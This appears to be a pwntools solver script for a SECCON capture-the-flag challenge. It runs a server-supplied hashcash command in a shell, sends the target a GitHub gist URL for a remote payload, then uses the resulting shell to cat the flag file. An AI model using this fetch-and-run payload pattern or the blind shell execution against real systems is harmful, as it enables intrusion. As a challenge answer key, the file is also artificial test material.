from __future__ import division, print_function
import random
from pwn import *
import argparse
import time
import sys
import os

context.log_level = 'error'

log = False
is_gaibu = True

url = b"https://gist.githubusercontent.com/moratorium08/d1f3269c12c65684229251575c0ddaf4/raw/22f4b92ca37f71462e622fc37a19c2937b20acc4/pwn.py"

if len(sys.argv) > 1:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = os.getenv('SECCON_HOST', 'localhost')
    port = int(os.getenv('SECCON_PORT', 30001))

r = remote(host, port)
r.recvuntil(b"Submit the token generated by `")
cmd = r.recvuntil(b"`").strip(b"`")
print(cmd)
result = subprocess.check_output(cmd, shell=True)
hashc = result.replace(b"hashcash token: ", b"")
r.sendline(hashc)

print("hashcash finished")

print("starting exploit...")
r.recvuntil(b" you don't have your own server")
r.sendline(url)

r.recvuntil("fake_tree")
r.sendline(b"echo nekoneko")
r.recvuntil(b"nekoneko\n")
r.sendline(b"cat flag-2ed5991c0023b19e969ed2a7882a2d59")
s = r.recvline()
if b"SECCON" in s:
    print(s)
    exit(0)
else:
    exit(1)
